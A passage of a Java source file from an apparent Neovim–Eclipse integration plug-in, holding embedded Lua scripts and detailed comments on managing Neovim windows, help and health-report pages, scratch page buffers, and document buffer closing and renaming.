              vim.api.nvim_create_autocmd('UIEnter', { group = group, once = true, callback = function() close() end })
              return false
            end
            -- 'mouse', told to Eclipse, which checks it before it sends a click on a grid (a floating
            -- window, q:, a page; util/MouseOption). Eclipse cannot ask at the click: Neovim holds an
            -- option read while it waits for a key (after f or r). Nor can Neovim drop the click as
            -- it reads it: vim.on_key runs after mappings, and dropping the first key of a mapping's
            -- right-hand side would run the rest as commands on the user's text. Told at each change,
            -- and looked at again at each mode change, for a :noautocmd set. "h" means every mode in
            -- a help buffer, so there it is told with an "a". Example: "nvi"; "ha" in :help with "h".
            local told_mouse
            local function tell_mouse()
              local value = vim.o.mouse
              if value:find('h', 1, true) and vim.bo.buftype == 'help' then
                value = value .. 'a'
              end
              if value ~= told_mouse then
                told_mouse = value
                vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_mouse_option', value)
              end
            end
            vim.api.nvim_create_autocmd({ 'ModeChanged', 'BufEnter', 'BufWinEnter', 'UIEnter' },
              { group = group, callback = tell_mouse })
            vim.api.nvim_create_autocmd('OptionSet',
              { group = group, pattern = { 'mouse', 'buftype' }, callback = tell_mouse })
            tell_mouse()
            -- Where each insert begins (insert_float, above).
            vim.api.nvim_create_autocmd('InsertEnter', {
              group = group,
              callback = function()
                local w = vim.api.nvim_get_current_win()
                insert_float = M.focused_float(w) and w or nil
              end,
            })
            vim.api.nvim_create_autocmd('WinClosed', {
              group = group,
              callback = function(ev)
                own[tonumber(ev.match)] = nil
                page_buf[tonumber(ev.match)] = nil
                page_kind[tonumber(ev.match)] = nil
                seen[tonumber(ev.match)] = nil
                opened_from[tonumber(ev.match)] = nil
                from_editor[tonumber(ev.match)] = nil
                vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_window_closed', tonumber(ev.match))
              end,
            })
            -- The second safety net: a window opened next to an editor's, in its tab, by something the
            -- refusals do not see (a plug-in's :split, <Cmd>split, vim.cmd.split()). On a file it
            -- becomes an Eclipse split or editor tab (take_file_window). Any other Eclipse would not
            -- show, but it would take the keys and half the editor's rows. Closed once the
            -- command that opened it is over, not inside its own WinNew, while that command still
            -- runs (and still fills the window, as :checkhealth does). The quickfix, location list and preview windows
            -- (:copen, :lopen, :pedit) are closed too: Eclipse cannot show them either, and in the
            -- editor's tab they would take its rows, so H, L and scrolling would no longer match
            -- the editor; the lists themselves stay, for :cnext and the like. Left alone: the
            -- plug-in's own windows, floating windows (hover, completion documentation; their
            -- win_gettype() is 'popup'), the windows of 'autocmd' (gone at once), and the
            -- command-line window ('command'), which has its own rule (SETUP).
            -- A closed quickfix or location list window is shown the Eclipse way instead of the
            -- message, when the quickfix module is there (QUICKFIX: the Problems or Tasks view, or
            -- the list's :clist, shown by Neovim), so :copen does what it is for.
            -- Floating windows are left alone here, the one that opened with the focus too (a
            -- picker's prompt, :Lazy, a dashboard): drawn, it takes the keys, and leaving the editor
            -- moves Neovim out of it (M.move_out_of_float); one the editor does not draw is closed by
            -- M.close_undrawn.
            -- A :checkhealth report opens in a window of its own however it is asked for (a new
            -- tab, a split with :vert, a float with vim.g.health's style 'float'), and Neovim has
            -- filled it and set its filetype by the time this net runs (after the command). Its
            -- buffer goes to a page editor instead (eclipse_view_page, then M.show_page): kept
            -- when its window closes ('bufhidden' hide: a float's would be wiped), unlisted, so
            -- that :ls and :bnext never meet it, and renamed health://<number>, since the next
            -- :checkhealth wipes whatever is named health://. Matched by all three marks Neovim's
            -- report has (filetype, scratch buffer, its name), so a file the user gave the
            -- filetype by hand is never taken.
            -- Neovim goes back to the window the report's was opened from first, then the window
            -- closes. Closed while current, its tab would hand Neovim to the next tab, another
            -- editor's.
            local function take_health_report(win)
              -- An earlier close in this pass (or an autocmd it fired) may have closed this window
              -- too; reading it would throw and end the whole net, leaving later windows open.
              if not vim.api.nvim_win_is_valid(win) then
                return false
              end
              local before = opened_from[win]
              local buf = vim.api.nvim_win_get_buf(win)
              if vim.bo[buf].filetype ~= 'checkhealth' or vim.bo[buf].buftype ~= 'nofile'
                  or vim.api.nvim_buf_get_name(buf) ~= 'health://' then
                return false
              end
              vim.bo[buf].bufhidden, vim.bo[buf].buflisted = 'hide', false
              -- A name of its own: Neovim's next :checkhealth wipes the buffer named health://
              -- first, which would close the page window showing this one.
              pcall(vim.api.nvim_buf_set_name, buf, 'health://' .. buf)
              -- A rename leaves the old name behind as an empty unlisted buffer (the alternate
              -- file, as :file does): wiped, so :ls! shows no stray health://.
              for _, b in ipairs(vim.api.nvim_list_bufs()) do
                if b ~= buf and vim.api.nvim_buf_get_name(b) == 'health://' and not vim.bo[b].buflisted
                    and #vim.fn.win_findbuf(b) == 0 and vim.api.nvim_buf_line_count(b) <= 1 then
                  pcall(vim.api.nvim_buf_delete, b, { force = true })
                end
              end
              if before and own[before] and vim.api.nvim_win_is_valid(before) then
                pcall(vim.api.nvim_set_current_win, before)
              end
              pcall(vim.api.nvim_win_close, win, true)
              vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_view_page', 'checkhealth', buf, 1)
              return true
            end
            -- A help window (:help, :helpgrep, :cnext through a :helpgrep list, a plug-in's
            -- vim.cmd.help, in a split, a tab or with :vert): Eclipse shows help in a page editor
            -- instead, a page window of this Neovim on the same help buffer (docs/ARCHITECTURE.md,
            -- decision 10), so Ctrl-], :helpgrep and the user's own help pages work as in a
            -- terminal. By the time this net runs, :help has set 'buftype' help and put the cursor
            -- on the topic: the buffer and that line go to Eclipse (eclipse_view_page, then
            -- M.show_page). Then, as for a report, back to the window it came from and the window
            -- closed; the buffer is kept ('bufhidden' hide, whatever 'hidden' says). Inside the
            -- help editor :help reuses its own window and never reaches this net (M.follow_page).
            local function take_help(win)
              if not vim.api.nvim_win_is_valid(win) or vim.fn.win_gettype(win) ~= '' then
                return false
              end
              local buf = vim.api.nvim_win_get_buf(win)
              local document = M.is_document(buf) and vim.bo[buf].buftype == 'help'
              if not document and not page_ok(buf, 'help') then
                return false
              end
              local line = vim.api.nvim_win_get_cursor(win)[1]
              if not document then
                vim.bo[buf].bufhidden = 'hide'
              end
              local before = opened_from[win]
              if before and own[before] and vim.api.nvim_win_is_valid(before) then
                pcall(vim.api.nvim_set_current_win, before)
              end
              pcall(vim.api.nvim_win_close, win, true)
              if document then
                give_document_back(buf) -- the window closed, no page: the editor keeps its document
              else
                vim.rpcnotify(vim.g.neovim4eclipse_channel or 0, 'eclipse_view_page', 'help', buf, line)
              end
              return true
            end
            --- Before win closes with force: a changed buffer stays, hidden. Without this its
            --- 'bufhidden' (wipe, delete, unload) would discard the changes with its last window.
            --- Only a buffer that can be written: a scratch buffer's 'modified' protects nothing.
            local function keep_changes(win)
              local buf = vim.api.nvim_win_get_buf(win)
              local buftype = vim.bo[buf].buftype
              if vim.bo[buf].modified and (buftype == '' or buftype == 'acwrite')
                  and #vim.fn.win_findbuf(buf) == 1 then
                vim.bo[buf].bufhidden = 'hide'
              end
            end
            --- The file of buf if a plug-in's window on it can become an Eclipse editor: an open
            --- document, or a plain buffer of a readable file without unsaved changes. Nothing else
            --- (a scratch or terminal buffer, a name like fugitive://, an untitled editor's), so
            --- that what passes is what :split file could open. Closing a window on a document
            --- loses nothing, since the document's own editor keeps showing its buffer.
            local function file_to_hand_over(buf)
              local document = M.is_document(buf)
              local name = vim.b[buf].neovim4eclipse_file or vim.api.nvim_buf_get_name(buf)
              if not document and (vim.bo[buf].buftype ~= '' or vim.bo[buf].modified) then
                return nil
              end
              if name == '' or vim.fn.isabsolutepath(name) == 0 or name:match('^%a[%w+.-]*://')
                  or vim.fn.filereadable(name) ~= 1 then
                return nil
              end
              return name
            end
            --- A plug-in's window on a file (a picker's Ctrl-V, Ctrl-X or Ctrl-T, a plain
            --- vim.cmd.split(file)) becomes an Eclipse split or editor tab, on the side Neovim put
            --- it and at its cursor; Neovim's window closes. Eclipse shows each window as an editor,
            --- so this is the window the plug-in asked for. Decided here because every window a
            --- plug-in opens passes this net. Example: Ctrl-V on b.txt in Telescope, with
            --- 'splitright' off: a window left of the editor's, so an editor to its left.
            local function take_file_window(win)
              local commands = package.loaded['neovim4eclipse.window_commands']
              if not commands or not vim.api.nvim_win_is_valid(win) or vim.fn.win_gettype(win) ~= '' then
                return false
              end
              local buf = vim.api.nvim_win_get_buf(win)
              local file = file_to_hand_over(buf)
              if not file then
                return false
              end
              local tab = vim.api.nvim_win_get_tabpage(win)
              -- Read from Neovim, not remembered: an editor's window that is current is where the
              -- action is (a plug-in's split opened without entering it, the next window of a
              -- pass). Else Neovim is in a plug-in's window: the editor that one came from.
              local current = vim.api.nvim_get_current_win()
              -- Opened behind a float that has the keyboard: left to the net's plain close. Handing
              -- it over would move Neovim into the editor, still in the float's mode. Example: a
              -- plug-in's background split while Telescope's prompt is in Insert mode; the next
              -- keys would be typed into the document.
              if win ~= current and M.focused_float(current) then
                return false
              end
              local before = own[current] and current or from_editor[win] or from_editor[current]
              if not (before and own[before] and vim.api.nvim_win_is_valid(before)) then
                before = nil -- none known: its tab's editor
                for _, w in ipairs(vim.api.nvim_tabpage_list_wins(tab)) do
                  if own[w] then
                    before = w
                    break
                  end
                end
              end
              if not before and win == current then
                -- A tab page opened with :noautocmd: no WinEnter said where from, and no editor is in
                -- it. Neovim keeps the tab page it came from as the previous one.
                local previous = vim.fn.tabpagenr('#')
                local w = previous > 0 and vim.fn.win_getid(vim.fn.tabpagewinnr(previous), previous) or 0
                before = own[w] and w or nil
              end
              if not before then
                return false
              end
              local at = vim.api.nvim_win_get_cursor(win)
              pcall(vim.api.nvim_set_current_win, before)
              -- An insert begun in a float must not go on in the editor: a plug-in that opens the
              -- split without :stopinsert would leave the next keys typing into the document.
              if insert_float ~= nil and in_insert() then
                stop_insert_in_place()
              end
              local where = 'tab'
              if vim.api.nvim_win_get_tabpage(before) == tab then
                local new, old = vim.fn.win_screenpos(win), vim.fn.win_screenpos(before)
                if new[1] == old[1] then
                  where = new[2] < old[2] and 'left' or 'right'
                else
                  where = new[1] < old[1] and 'above' or 'below'
                end
              end
              keep_changes(win)
              if not pcall(vim.api.nvim_win_close, win, true) then
                return false
              end
              commands.open_beside(where, file, at[1], at[2] + 1)
              return true
            end
            -- The window last left: when a command opens a window and enters it (:checkhealth's
            -- `tab sbuffer`, a split), WinLeave fires in the old window, then WinNew and WinEnter in
            -- the new. A window opened without entering it (nvim_open_win(buf, false, ...)) fires
            -- WinNew alone, with that window current for the moment, so only WinEnter says that
            -- left_from is where a window came from: at WinNew it may be an editor left long ago.
            local left_from = home
            vim.api.nvim_create_autocmd('WinLeave', {
              group = group,
              callback = function()
                left_from = vim.api.nvim_get_current_win()
              end,
            })
            vim.api.nvim_create_autocmd('WinEnter', {
              group = group,
              callback = function()
                local win = vim.api.nvim_get_current_win()
                if win ~= left_from and not own[win] and not opened_from[win] then
                  opened_from[win] = left_from
                  from_editor[win] = own[left_from] and left_from or from_editor[left_from]
                end
              end,
            })
            --- The net itself: looks at each window it has not seen yet. Scheduled, so that the command
            --- that opened the window is over.
            local function check_new_windows()
              local why, list
              local quickfix = package.loaded['neovim4eclipse.quickfix']
              for _, win in ipairs(vim.api.nvim_list_wins()) do
                -- ui2's windows (UI2) showing ui2's own buffers are Neovim's command line and
                -- messages: never closed. One showing another buffer is a float like any other.
                local new = not seen[win] and not shows_ui2_buffer(win)
                seen[win] = true
                local wintype = vim.fn.win_gettype(win)
                -- A report taken leaves its window closed: the checks below then pass it by.
                local taken = new and not own[win] and (take_health_report(win) or take_help(win)
                  or take_file_window(win))
                local reason = not taken and not own[win] and why_closed[wintype]
                if reason and vim.api.nvim_win_is_valid(win) then
                  keep_changes(win)
                end
                if reason and vim.api.nvim_win_is_valid(win) and pcall(vim.api.nvim_win_close, win, true) then
                  if quickfix and (wintype == 'quickfix' or wintype == 'loclist') then
                    list = list or wintype
                  else
                    why = why or reason
                  end
                end
              end
              if why then
                vim.api.nvim_echo({ { 'Window closed: ' .. why } }, true, { err = true })
              end
              if list then
                quickfix.window(list)
              end
            end
            vim.api.nvim_create_autocmd('WinNew', {
              group = group,
              callback = function()
                vim.schedule(check_new_windows)
              end,
            })
            -- :noautocmd split fires no WinNew, and Neovim would go on in a window Eclipse does not
            -- draw, with the keys editing its buffer unseen. SafeState comes as Neovim is about to
            -- wait for a key, whatever opened the window, so the net still runs.
            vim.api.nvim_create_autocmd('SafeState', {
              group = group,
              callback = function()
                for _, win in ipairs(vim.api.nvim_list_wins()) do
                  if not seen[win] then
                    vim.schedule(check_new_windows)
                    return
                  end
                end
              end,
            })
            package.loaded['neovim4eclipse.windows'] = M
            return home
            """;

    /**
     * Installs the module {@code neovim4eclipse.windows}: a Neovim window per Eclipse editor, each
     * alone in its own tabpage (docs/design/WINDOWS.md; Java side {@code DocumentBuffers} and
     * {@code EditorWindows}). Argument: the home buffer's number. Returns the <em>home window</em>'s
     * id: the window the plug-in started in, which shows a document when its editor has no window of
     * its own, and is never closed by the plug-in.
     *
     * <p>Why tabpages: one window per tab fills Neovim's screen, which is the attached editor's size
     * (VIEWPORT.md), so {@code H}, {@code L} and {@code Ctrl-D} match the editor, and window commands
     * stay inside the editor's tab. {@code 'showtabline'} is set to 0, a setting the plug-in changes
     * (docs/USER_GUIDE.md, "Neovim settings the plug-in changes"): Neovim's default, 1, would show a tab line as
     * soon as a second editor has a window, and take a row from the editor.
     *
     * <p>The functions, each called by one of the scripts below:
     * <ul>
     *   <li>{@code open(buf, folder)}: {@link #OPEN_WINDOW}.</li>
     *   <li>{@code show(win, buf)}: {@link #SHOW_WINDOW}.</li>
     *   <li>{@code travel(win, buf, line, col)}: {@link #TRAVEL_WINDOW}.</li>
     *   <li>{@code close(win, fallback)}: {@link #CLOSE_WINDOW}.</li>
     *   <li>{@code release(buf, fallback)}: {@link #RELEASE_BUFFER}.</li>
     *   <li>{@code home_buffer()}: {@link #HOME_BUFFER}; {@code close} and {@code release} use it
     *       too, for a fallback buffer Neovim wiped.</li>
     *   <li>{@code is_side_window(win)}: whether a window is a floating or special one beside an
     *       editor's, where {@code :q} is Neovim's ({@link #WINDOW_COMMANDS}).</li>
     * </ul>
     *
     * <p><b>Quietly</b> means with {@code 'eventignore'} set to {@code all}: what the plug-in does to
     * a window that is not the current one fires no autocommand, so Eclipse does not take it for
     * something the user did. Example: {@code nvim_win_set_buf} on a window of another tab enters it
     * for a moment and fires {@code BufEnter} (WINDOWS.md, E7), which Eclipse would follow as a jump.
     *
     * <p>The safety net: {@code WinClosed} sends {@code eclipse_window_closed(win)}, so that a window
     * the user closed in Neovim ({@code :tabclose}, a plug-in's {@code nvim_win_close}) is forgotten,
     * and its editor gets a new one at its next attach. The plug-in's own closes are quiet and do not
     * send it. A home window closed that way is opened again by the next {@code show} of it.
     *
     * <p>The second net, {@code WinNew}, closes a window Eclipse cannot show (a stray split, the
     * quickfix window) once the command that opened it is over; floats are left to
     * {@code close_undrawn} ({@link #CLOSE_UNDRAWN_FLOAT}). A changed buffer outlives that close,
     * whatever its {@code 'bufhidden'}. Two kinds of
     * window it hands to a page editor instead: a {@code :checkhealth} report's and a help
     * window ({@code :help}, {@code :helpgrep}). Their buffer stays, and
     * {@code eclipse_view_page(kind, buf, line)} asks Eclipse to show it in a page window of its
     * own ({@code show_page}); the window it came in closes, with no message
     * ({@code docs/ARCHITECTURE.md}, decision 10). A window on a file (a picker's split action)
     * becomes an Eclipse split or editor tab on that file, at its cursor ({@code take_file_window}).
     *
     * <p><b>In two halves</b>, joined as the class loads: one Lua chunk, so that the module's
     * locals are seen throughout, but more text than Java allows in one constant (65,535 bytes of
     * UTF-8 in a class file). Joined with {@code concat}, it is no compile-time constant: classes
     * that use it read it here, so a change to it needs no rebuild of theirs. The halves split
     * between two functions; either may grow until it nears that limit.
     */
    static final String WINDOWS = WINDOWS_FIRST_HALF.concat(WINDOWS_SECOND_HALF);

    /**
     * Vim's window commands, carried out on Eclipse's editors: each Vim window is an editor, and a
     * split is a new editor stack beside the current one (docs/design/SPLITS.md). The code and its
     * comments: {@code core/lua/window_commands.lua}.
     */
    static final String WINDOW_COMMANDS = LuaModules.script("window_commands.lua");

    /**
     * Eclipse's <i>Toggle Split Editor</i> in an editor Neovim drives (argument: "1" for side by
     * side, "0" for one above the other): Neovim sends the split back as {@code :vsplit} or
     * {@code :split} would, so {@code 'splitright'} and {@code 'splitbelow'} decide the side
     * ({@link #WINDOW_COMMANDS}; {@code editor/SplitEditorHandler}).
     */
    static final String SPLIT_WINDOW = """
            require('neovim4eclipse.window_commands').split(select(1, ...) == '1')
            """;

    /**
     * The home buffer's number, made anew if Neovim wiped it ({@code M.home_buffer} in
     * {@link #WINDOWS}). Example: a plug-in ran {@code :bwipeout 2} (the home buffer's usual number:
     * Neovim's own buffer 1 is wiped at start); Eclipse, finding the home buffer
     * gone when it goes back to it, gets 9, a new unlisted scratch buffer, and shows that.
     */
    static final String HOME_BUFFER = """
            return require('neovim4eclipse.windows').home_buffer()
            """;

    /**
     * A page's text in the editing Neovim, for a page editor shown from a window of this Neovim
     * (the messages page): puts text into the page's own buffer, made on first use, and returns
     * its number. Arguments: the page's name ({@code "messages"}); the lines; the lines to color, as
     * {@code {line, group}} pairs (0-based lines, Neovim's highlight groups: {@code {0, "ErrorMsg"}});
     * and {@code "end"} or {@code "top"}, where the page's windows put the cursor ({@code :messages}:
     * on the newest message, the last line).
     *
     * <p>The buffer is a scratch one that no file has ({@code buftype=nofile}, unlisted, no swap
     * file, kept when hidden), named {@code neovim4eclipse://<name>} so that {@code :ls!} and the
     * status line say what it is, and changeable only while its text is set ({@code nomodifiable}
     * again at the end), so a page can never be typed into or written by accident: every write
     * that runs autocommands, {@code :w x}, {@code :1w x} and {@code :w >> x} too, gets Vim's E382
     * from the page's own write hooks. Two deliberate commands still work, as they skip those
     * hooks by design: {@code :noautocmd w x} writes the page's text to {@code x}, and
     * {@code :w !cmd} hands it to a shell command. Made and filled quietly: no {@code BufNew},
     * {@code BufFilePost} or {@code TextChanged} for the user's config or the plug-in's own buffer hooks, which are about files. {@code q} in it
     * closes the page editor ({@code :Eclipse quit}, which names the page's window as its origin);
     * a {@code q} the user mapped for the buffer is kept. The colors are the user's: this is their
     * Neovim. Example: {@code ("messages", {"E486: x", "3 lines yanked"}, {{0, "ErrorMsg"}}, "end")}
     * fills {@code neovim4eclipse://messages} with two lines, the first in the error color.
     */
    static final String PAGE_TEXT = """
            local name, lines, highlights, cursor = ...
            local full = 'neovim4eclipse://' .. name
            local saved = vim.o.eventignore
            vim.o.eventignore = 'all'
            local ok, result = pcall(function()
              -- Found by a mark of the plug-in's own, not by the name: a buffer that only took the
              -- same name (gf on the text neovim4eclipse://messages) is never taken for the page.
              local buf
              for _, b in ipairs(vim.api.nvim_list_bufs()) do
                if vim.b[b].neovim4eclipse_page == name then
                  buf = b
                end
              end
              if not buf then
                buf = vim.api.nvim_create_buf(false, true)
                pcall(vim.api.nvim_buf_set_name, buf, full)
                vim.b[buf].neovim4eclipse_page = name
                -- Never written: 'nofile' refuses a plain :w (E382), but Vim writes such a buffer
                -- under a name (:w x, :1w x, :w >> x, :w! x), straight to disk, behind Eclipse.
                -- Every write to a file that runs autocommands runs one of these, so each is
                -- refused and writes nothing. Not caught, on purpose: :noautocmd w x and :w !cmd,
                -- commands the user types knowing what they do. Yanking the text into an editor
                -- still works.
                -- The error as Vim words it, through nvim_echo: a Lua error() would show a stack
                -- traceback after it (probed on 0.12.6). Neovim puts its own line before it,
                -- "Error in BufWriteCmd Autocommands for ...", as for any autocommand's error.
                for _, event in ipairs({ 'BufWriteCmd', 'FileWriteCmd', 'FileAppendCmd' }) do
                  vim.api.nvim_create_autocmd(event, {
                    buffer = buf,
                    callback = function()
                      vim.api.nvim_echo({ { "E382: Cannot write, 'buftype' option is set" } }, true, { err = true })
                    end,
                  })
                end
              end
              local bo = vim.bo[buf]
              bo.buftype, bo.bufhidden, bo.swapfile, bo.buflisted = 'nofile', 'hide', false, false
              bo.modifiable = true
              vim.api.nvim_buf_set_lines(buf, 0, -1, false, lines)
              bo.modifiable, bo.modified = false, false
              local ns = vim.api.nvim_create_namespace('neovim4eclipse.page')
              vim.api.nvim_buf_clear_namespace(buf, ns, 0, -1)
              for _, h in ipairs(highlights) do
                pcall(vim.api.nvim_buf_set_extmark, buf, ns, h[1], 0, { line_hl_group = h[2] })
              end
              local own_q = vim.api.nvim_buf_call(buf, function()
                return vim.fn.maparg('q', 'n', false, true)
              end)
              if own_q.buffer ~= 1 or own_q.desc == 'Close the page editor' then
                vim.keymap.set('n', 'q', '<Cmd>Eclipse quit<CR>', { buffer = buf, nowait = true, desc = 'Close the page editor' })
              end
              local line = cursor == 'end' and vim.api.nvim_buf_line_count(buf) or 1
              for _, win in ipairs(vim.fn.win_findbuf(buf)) do
                pcall(vim.api.nvim_win_set_cursor, win, { line, 0 })
              end
              vim.b[buf].neovim4eclipse_page_cursor = cursor
              return buf
            end)
            vim.o.eventignore = saved
            if not ok then
              error(result, 0)
            end
            return result
            """;

    /**
     * Opens a page's window on a buffer (argument: its number) in a new tabpage, quietly, without
     * entering it, and returns its id; -2 when the buffer is gone. Its options are a page's, and
     * the IDE keys are Neovim's in that buffer. See {@link #WINDOWS} ({@code open_page}).
     */
    static final String OPEN_PAGE_WINDOW = """
            return require('neovim4eclipse.windows').open_page(tonumber((select(1, ...))))
            """;

    /**
     * Shows a buffer Neovim made for a page ({@code :help}'s help buffer, a {@code :checkhealth}
     * report) in a page window. Arguments: the page window's id ({@code -1}: open a new one), the
     * buffer, the line to put at the top, and the kind ({@code "help"}, {@code "checkhealth"}).
     * Returns the window, or -2 when the buffer is gone. See {@link #WINDOWS} ({@code show_page}).
     */
    static final String SHOW_PAGE_BUFFER = """
            local win, buf, line, kind = ...
            return require('neovim4eclipse.windows').show_page(tonumber(win), tonumber(buf), tonumber(line), kind)
            """;

    /**
     * Opens another page window like a page window (argument: its id), on the buffer it shows and
     * of its kind: a {@code :split} of the page. Returns {@code {window, buffer}}, or
     * {@code {-1, -1}} when it is no page window. See {@link #WINDOWS} ({@code open_page_like}).
     */
    static final String OPEN_PAGE_LIKE = """
            return require('neovim4eclipse.windows').open_page_like(tonumber((select(1, ...))))
            """;

    /**
     * Puts a page window's own buffer back into it (argument: the window id), after Neovim put
     * another there; returns the page's buffer, or -1 when it is no open page window. See
     * {@link #WINDOWS} ({@code restore_page}).
     */
    static final String RESTORE_PAGE_WINDOW = """
            return require('neovim4eclipse.windows').restore_page(tonumber((select(1, ...))))
            """;

    /**
     * Opens the window of an editor (arguments: the buffer number, and the folder for {@code :lcd},
     * "" to keep the one it copies) in a new tabpage, without entering it, and returns its id; -2,
     * nothing opened, when the buffer was wiped in Neovim (as {@link #SHOW_WINDOW}). Its jump
     * history starts empty. See {@link #WINDOWS}.
     */
    static final String OPEN_WINDOW = """
            local buf, folder = tonumber((select(1, ...))), (select(2, ...))
            return require('neovim4eclipse.windows').open(buf, folder)
            """;

    /**
     * Makes a window the current one, showing a buffer (arguments: the window id, -1 for the home
     * window, and the buffer number), and returns the id of the window shown, or without doing
     * anything -1 when that window was closed in Neovim (Eclipse then opens a new one), -2 when the
     * buffer was wiped there (Eclipse goes back to the home buffer: {@code DocumentBuffers.returnToAttached}).
     * Example: {@code ("1001", "3")} enters editor B's
     * window, which shows buffer 3 already; Neovim fires {@code BufEnter} for buffer 3 there, which
     * Eclipse recognizes as its own switch. See {@link #WINDOWS}.
     */
    static final String SHOW_WINDOW = """
            local win, buf = tonumber((select(1, ...))), tonumber((select(2, ...)))
            return require('neovim4eclipse.windows').show(win, buf)
            """;

    /**
     * The Neovim half of a window travelling on {@code Ctrl-O} (arguments: the other editor's
     * window, the buffer left behind, its 1-based line and 0-based byte column): the other editor's
     * window, which is not the current one, is quietly given the buffer the jump left and its cursor.
     * {@code EditorWindows.swap} then gives each editor the other's window. See {@link #WINDOWS}.
     */
    static final String TRAVEL_WINDOW = """
            local win, buf = tonumber((select(1, ...))), tonumber((select(2, ...)))
            local line, col = tonumber((select(3, ...))), tonumber((select(4, ...)))
            require('neovim4eclipse.windows').travel(win, buf, line, col)
            """;

    /**
     * Eclipse's Back went nowhere for {@code Ctrl-O} steps (arguments: the first step's id and the
     * number of steps): the start of its history, or nothing visible changed. The trail of
     * {@link #SETUP} forgets them, so that {@code Ctrl-I} does not undo steps that moved nothing.
     */
    static final String HISTORY_NOWHERE = """
            require('neovim4eclipse.history').nowhere(tonumber((select(1, ...))), tonumber((select(2, ...))))
            """;

    /**
     * The user switched editors in Eclipse after a {@code Ctrl-O} that went Back (a tab click,
     * {@code F3}): the trail of {@link #SETUP} is forgotten, so {@code Ctrl-I} works as without it
     * (Neovim's newer jump, else Forward) instead of undoing a Back Eclipse no longer remembers.
     */
    static final String HISTORY_FORGET = """
            require('neovim4eclipse.history').forget()
            """;

    /**
     * Closes an editor's window and its tab quietly (arguments: the window id, and the buffer the
     * home window shows if the closed window was the current one: the home buffer instead if that
     * one was wiped), and returns the home window's id (it may have been opened again) and the home
     * buffer's number (it may have been made anew: {@code M.home_buffer}). Example: {@code {1000, 2}};
     * after a plug-in's {@code :bwipeout 2}, {@code {1000, 9}}. A plug-in's float with the cursor
     * in that tab is left first, its insert ended ({@code leave_float_of}). See {@link #WINDOWS}.
     */
    static final String CLOSE_WINDOW = """
            local win, fallback = tonumber((select(1, ...))), tonumber((select(2, ...)))
            return require('neovim4eclipse.windows').close(win, fallback)
            """;

    /**
     * Closes a document's buffer after its last editor closed (argument: its number), as Vim's
     * {@code :bd} does: unloaded and unlisted, but kept, with its number, marks and last cursor
     * position, so that the file's next editor gets the same buffer back (CREATE_DOCUMENT_BUFFER;
     * docs/design/BUFFER_NUMBERS.md). Example: a.txt is buffer 1; closing its editor leaves
     * {@code 1u} in {@code :ls!}, and opening it again gives buffer 1, not a new number.
     *
     * <p>In order: the plug-in's autocommands for the buffer go (the write hook and the safety net
     * belong to a document with an editor); {@code 'buftype'} goes back to a normal file's, since
     * Neovim drops the marks of an {@code acwrite} buffer when it unloads it (BUFFER_NUMBERS.md, X4); then unload and
     * unlist. {@code b:neovim4eclipse_file} stays. Nothing for a buffer that is gone.
     *
     * <p><b>A buffer Neovim unloaded itself</b> is only unlisted: {@code nvim_buf_delete} with
     * {@code unload} fails ("Failed to unload buffer") on a buffer that is not loaded. Example: a
     * Lua plug-in, or {@code <Cmd>bd! 3<CR>}, runs {@code :bdelete! 3} (without {@code !} Neovim
     * refuses with E89 while the editor has unsaved changes, and nothing closes); the safety net in
     * {@link #DOCUMENT_BUFFER} tells Eclipse, which closes the editor, and this script then finds
     * buffer 3 unloaded and unlisted already. Its marks are kept all the same: the document's
     * {@code BufUnload} hook set {@code 'buftype'} to {@code ''} for that unload (X5), and the
     * {@code ''} set here keeps it a closed file's buffer instead of a document's.
     */
    static final String CLOSE_DOCUMENT_BUFFER = """
            local buf = tonumber((select(1, ...)))
            if not vim.api.nvim_buf_is_valid(buf) then
              return
            end
            pcall(vim.api.nvim_clear_autocmds, { group = 'neovim4eclipse_document', buf = buf })
            vim.bo[buf].buftype = ''
            if vim.api.nvim_buf_is_loaded(buf) then -- not after Neovim's own :bdelete, which unloaded it
              vim.api.nvim_buf_delete(buf, { force = true, unload = true }) -- force: unsaved changes live in Eclipse
            end
            vim.bo[buf].buflisted = false
            """;

    /**
     * Renames a document's buffer after its file (arguments: the buffer's number, the new name), when
     * Eclipse moved the editor to another file: a rename or move of the open file, File › Save As
     * ({@code editor/EditorAttachManager.rebind}). The buffer stays, with its number, undo history
     * and marks, as after Vim's {@code :saveas}. Returns whether the buffer has the name now.
     *
     * <p>{@code b:neovim4eclipse_file} is set first: {@link #DOCUMENT_BUFFER}'s {@code BufFilePost}
     * check puts back a name that is not the file's (it undoes {@code :file new.txt}), and must find
     * the new name to be the file's. That check also wipes the unloaded buffer the rename leaves
     * under the old name (Vim's alternate file). Nothing for a buffer already so named (Neovim's own
     * {@code :saveas} renamed it) or one that is gone (it is made under the new name when shown).
     * The rename fails (E95) when a loaded buffer has the name already; then the old name and file
     * stay, and the caller closes the buffer, so that it is made anew under the new name.
     *
     * <p>Like any rename, it marks the buffer {@code [Not edited]} in its file info until the next
     * write; writes go through Eclipse ({@code BufWriteCmd}) and work as usual.
     */
    static final String RENAME_DOCUMENT_BUFFER = """
            local buf, name = tonumber((select(1, ...))), select(2, ...)
            if not vim.api.nvim_buf_is_valid(buf) then
              return true
            end
            local canonical = require('neovim4eclipse.paths').canonical -- PATHS: case, links, separators
            if canonical(vim.api.nvim_buf_get_name(buf)) == canonical(name) then
              vim.b[buf].neovim4eclipse_file = vim.api.nvim_buf_get_name(buf)
              return true
            end
            local before = vim.b[buf].neovim4eclipse_file
            vim.b[buf].neovim4eclipse_file = name
            if not pcall(vim.api.nvim_buf_set_name, buf, name) then
              vim.b[buf].neovim4eclipse_file = before
              return false
            end
            vim.b[buf].neovim4eclipse_file = vim.api.nvim_buf_get_name(buf) -- as Neovim names it (links resolved)
            return true
            """;

    /**
     * Splits lines that hold carriage returns into the lines Eclipse's document shows them as
     * (arguments: the buffer's number, its window, a list of {@code {line1, parts}}). Returns the
     * window's cursor after the split as {@code {line1, col0}}, or {@code nil} without a window.
     *
     * <p>Why: Neovim keeps {@code \r} inside a line ({@code Ctrl-V Ctrl-M}, {@code :s} with
     * {@code nr2char(13)}, {@code Ctrl-R Ctrl-R} of a register holding one); Eclipse takes it as a
     * line break, so the line is two there and the lines below it are numbered differently on each
     * side ({@code sync/SplitLines}). After this script Neovim holds Eclipse's lines. Neovim does the
     * split, rather than Eclipse pushing its lines, because only Neovim knows its cursor at that
     * moment: on {@code "beta1\r2x"} with the cursor after {@code x} (byte 8), the cursor goes to
